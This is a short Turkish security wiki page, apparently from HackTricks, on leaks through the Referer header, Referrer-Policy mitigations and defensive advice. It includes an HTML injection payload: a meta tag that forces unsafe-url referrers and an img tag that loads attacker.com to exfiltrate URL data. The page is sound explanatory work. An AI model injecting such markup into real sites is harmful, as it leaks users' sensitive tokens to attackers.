# İlginç HTTP

{{#include ../banners/hacktricks-training.md}}

## Referrer header'ları ve policy

Referrer, tarayıcıların daha önce ziyaret edilen sayfayı belirtmek için kullandığı header'dır.

### Hassas bilgilerin leak olması

Bir web sayfasının herhangi bir noktasında GET request parametrelerinde hassas bilgiler bulunuyorsa, sayfa harici kaynaklara bağlantılar içeriyorsa veya bir saldırgan kullanıcıyı saldırganın kontrol ettiği bir URL'yi ziyaret etmeye ikna edebiliyor/öneride bulunabiliyorsa (social engineering), hassas bilgileri en son GET request içinde exfiltrate edebilir.

### Mitigation

Tarayıcının, hassas bilgilerin diğer web uygulamalarına gönderilmesini **önleyebilecek** bir **Referrer-policy** izlemesini sağlayabilirsiniz:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
### Karşı Önlem

Bu kuralı bir HTML meta tag'i kullanarak geçersiz kılabilirsiniz (saldırganın bir HTML injection açığından yararlanması gerekir):
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Savunma

URL içindeki GET parametrelerine veya path'lere hiçbir zaman hassas veri koymayın.

{{#include ../banners/hacktricks-training.md}}
